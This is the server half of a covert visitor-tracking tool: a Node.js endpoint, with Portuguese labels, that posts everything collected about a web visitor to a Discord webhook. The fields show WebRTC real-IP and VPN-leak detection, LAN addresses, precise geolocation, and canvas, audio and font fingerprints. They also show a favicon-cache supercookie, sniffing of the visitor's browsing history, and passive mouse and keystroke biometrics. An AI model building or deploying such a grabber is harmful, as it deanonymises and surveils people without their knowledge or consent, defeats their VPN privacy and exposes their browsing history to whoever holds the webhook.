// api/send-to-discord.js

module.exports = async function(req, res) {
    if(req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
    if(!DISCORD_WEBHOOK_URL) return res.status(500).send('Webhook URL não configurada.');

    try{
        const d = req.body;
        const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
                || req.headers['client-ip']
                || d.ip || 'N/A';

        if(d._update === 'behavior'){
            const embed = {
                title: '🖱 Comportamento do Visitante',
                color: 0x9b59b6,
                fields: [
                    {name:'🖱 Movimentos de mouse', value:String(d.mouseMoves||'0'),       inline:true},
                    {name:'⚡ Velocidade média',    value:d.mouseVelocity||'N/A',           inline:true},
                    {name:'📐 Accel jitter',        value:d.accelJitter||'N/A',             inline:true},
                    {name:'🎲 Mouse entropy',       value:d.mouseEntropy||'N/A',            inline:true},
                    {name:'🤖 Human score',         value:d.humanScore||'N/A',              inline:true},
                    {name:'📜 Eventos de scroll',   value:String(d.scrollEvents||'0'),      inline:true},
                    {name:'📏 Velocidade scroll',   value:d.scrollSpeed||'N/A',             inline:true},
                    {name:'⌨️ Teclas pressionadas', value:String(d.keystrokes||'0'),        inline:true},
                    {name:'🖱 Cliques',             value:String(d.clicks||'0'),            inline:true},
                ],
                footer:{text:'Biometria passiva (4s de observação) + Shannon entropy'},
                timestamp: new Date().toISOString(),
            };
            await fetch(DISCORD_WEBHOOK_URL,{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({embeds:[embed]}),
            });
            return res.status(200).send('ok');
        }

        const mapsUrl = d.loc && d.loc !== 'N/A'
            ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(d.loc)}`
            : null;

        // Read Vercel server-side headers passed from the client payload
        const ja4       = d.ja4       || 'N/A';
        const geoCountry= d.geoCountry|| 'N/A';
        const geoCity   = d.geoCity   || 'N/A';
        const geoRegion = d.geoRegion || 'N/A';
        const geoCoords = (d.geoLat && d.geoLon && d.geoLat!=='N/A') ? `${d.geoLat},${d.geoLon}` : 'N/A';
        const geoMapsUrl= (d.geoLat && d.geoLon && d.geoLat!=='N/A')
            ? `https://maps.google.com/?q=${d.geoLat},${d.geoLon}` : null;
        const edgeIP    = d.edgeIP    || ip;

        const embed1 = {
            title: '👁 Novo visitante - Rede & Localização',
            color: 0x5865f2,
            fields: [
                // ── Vercel Edge (server-side, cannot be spoofed by client) ──
                {name:'🔷 Edge IP (Vercel)',   value: edgeIP,                               inline:true},
                {name:'🔐 JA4 TLS digest',    value: `\`${ja4}\``,                         inline:false},
                {name:'🌍 Geo (Edge)',         value: `${geoCity}, ${geoRegion}, ${geoCountry}`, inline:true},
                {name:'📡 Geo ASN (Edge)',     value: d.geoASN||'N/A',                     inline:true},
                {name:'🕐 Geo TZ (Edge)',      value: d.geoTZ||'N/A',                      inline:true},
                {name:'🗺 Geo Coords (Edge)',  value: geoMapsUrl?`[${geoCoords}](${geoMapsUrl})`:geoCoords, inline:true},
                {name:'🌐 IP (header)',        value: ip,                                    inline:true},
                {name:'⚠️ WebRTC real IP',     value: d.rtcPublicIPs||'N/A',                inline:true},
                {name:'🏠 IP local (LAN)',     value: d.rtcLocalIPs||'N/A',                 inline:true},
                {name:'🕵️ VPN leak (WebRTC)', value: d.rtcLeak||'N/A',                     inline:true},
                {name:'📡 RTT closest',        value: d.rttClosest||'N/A',                  inline:true},
                {name:'📊 RTT top-5',          value: (d.rttTop||'N/A').slice(0,200),       inline:false},
                {name:'🌍 IP timezone',        value: d.ipTZ||'N/A',                        inline:true},
                {name:'⏱ TZ divergence',      value: d.tzDivergence||'N/A',                inline:true},

                {name:'🎯 Região estimada',    value: d.estimatedRegion||'N/A',             inline:true},
                {name:'🗓 TZ region',          value: d.estimatedTZRegion||'N/A',           inline:true},
                {name:'🕵 VPN likely',         value: d.vpnLikely||'N/A',                   inline:true},
                {name:'💡 Confidence',         value: d.locConfidence||'N/A',               inline:true},
                {name:'📏 Dist from IP',       value: d.distFromIPkm||'N/A',               inline:true},
                {name:'🚩 Flags',              value: d.locFlags||'N/A',                    inline:true},

                {name:'📍 Localização (IP)',   value: `${d.city||'?'}, ${d.region||'?'}, ${d.country||'?'}`, inline:true},
                {name:'🏢 Provedor',           value: d.org||'N/A',                         inline:true},
                {name:'🗺 Coords',             value: mapsUrl?`[${d.loc}](${mapsUrl})`:d.loc||'N/A', inline:true},
                {name:'🕐 Timezone',           value: `${d.tz||'N/A'} (${d.tzOffset||'N/A'})`,       inline:true},
                {name:'🕰 Timestamp',          value: d.ts||'N/A',                          inline:true},
            ]
        };

        const embed2 = {
            title: '💻 Dispositivo & Hardware',
            color: 0x5865f2,
            fields: [
                {name:'🔍 Loc Verdict',        value: (d.locVerdict||'N/A').slice(0,200),   inline:false},
                {name:'📋 TZ detail',          value: d.tzDivDetail||'N/A',                 inline:false},
                {name:'🖥 Browser',            value: d.browser||'N/A',                     inline:true},
                {name:'💻 Plataforma',         value: d.platform||'N/A',                    inline:true},
                {name:'🏗 Arquitetura',        value: `${d.cpuArch||'N/A'} (${d.cpuBitness||'N/A'}-bit)`, inline:true},
                {name:'📱 Modelo',             value: d.deviceModel||'N/A',                 inline:true},
                {name:'🔢 Versão OS',          value: d.platformVersion||'N/A',             inline:true},
                {name:'📱 Mobile / Touch',     value: `${d.mobile||'N/A'} / ${d.touch||'0'} pts`, inline:true},
                {name:'⚙ CPU cores / RAM',    value: `${d.cores||'N/A'} / ${d.memory||'N/A'}`, inline:true},
                {name:'🎮 GPU Vendor',         value: d.webglVendor||'N/A',                 inline:false},
                {name:'🖼 GPU Renderer',       value: d.webglRenderer||'N/A',               inline:false},
                {name:'🖥 Resolução',          value: `${d.resolution||'N/A'} (DPR: ${d.dpr||'1'})`, inline:true},
                {name:'🔋 Bateria',            value: `${d.batteryLevel||'N/A'} (${d.batteryCharging||'N/A'})`, inline:true},
                {name:'📷 Mídia (Cam/Mic/Spk)',value: `${d.cameras||'0'}/${d.mics||'0'}/${d.speakers||'0'}`, inline:true},
                {name:'🌀 Sensores (Acel/Giro/Ori)', value: `${d.hasAccelerometer||'no'}/${d.hasGyroscope||'no'}/${d.hasOrientation||'no'}`, inline:true},
                {name:'📶 Conexão / RTT',      value: `${d.connection||'N/A'} / ${d.rtt||'N/A'}`, inline:true},
                {name:'⏱ Load time',          value: d.loadTime||'N/A',                   inline:true},
                {name:'🔗 Referrer',           value: (d.referrer||'(direct)').slice(0,200), inline:false},
            ]
        };

        const embed3 = {
            title: '🧬 Fingerprints & Info',
            color: 0x5865f2,
            fields: [
                {name:'🖌 Canvas FP',          value: `\`0x${d.canvasFp||'N/A'}\``,        inline:true},
                {name:'🎵 Audio FP (sum)',      value: `\`${d.audioFp||'N/A'}\``,           inline:true},
                {name:'🎵 Audio FP (hash)',     value: `\`${d.audioFpHash||'N/A'}\``,       inline:true},
                {name:'😀 Emoji Canvas FP',    value: `\`${d.emojiFpHash||'N/A'}\``,       inline:true},
                {name:'🔢 Math/FPU FP',        value: `\`${d.mathFpHash||'N/A'}\``,        inline:true},
                {name:'🍪 Favicon Cache ID',   value: `\`${d.faviconId||'N/A'}\``,         inline:true},
                {name:'🔁 Favicon returning',  value: d.faviconReturning||'N/A',            inline:true},
                {name:'🌐 Sites visitados',     value: (d.sniffVisited||'N/A').slice(0,200), inline:false},
                {name:'🔢 Qtd detectada',       value: d.sniffVisitedCount||'N/A',           inline:true},
                {name:'⏱ Sniff raw (ms)',      value: (d.sniffRaw||'N/A').slice(0,200),     inline:false},
                {name:'📅 Visit #',            value: d.visitCount||'N/A',                 inline:true},
                {name:'🗓 First seen',         value: d.firstSeen||'N/A',                  inline:true},
                {name:'📆 Days since first',   value: d.daysSinceFirst||'N/A',             inline:true},
                {name:'🔄 LS returning',       value: d.lsReturning||'N/A',                inline:true},
                {name:'🧵 Worker parallelism', value: d.workerParallel||'N/A',             inline:true},
                {name:'🚨 Core spoof suspect', value: d.coreSpoofSuspect||'N/A',           inline:true},
                {name:'🎨 Color scheme',       value: d.mqColorScheme||'N/A',              inline:true},
                {name:`🔤 Fontes (${d.fontCount||0})`, value:(d.fonts||'none').slice(0,200), inline:false},
            ],
            footer: { text: `UA: ${(d.userAgent||'').slice(0,120)}` },
            timestamp: new Date().toISOString(),
        };

        await fetch(DISCORD_WEBHOOK_URL,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({embeds:[embed1, embed2, embed3]}),
        });

        return res.status(200).send('ok');
    }catch(e){
        console.error(e);
        return res.status(500).send('Erro: '+e.message);
    }
};
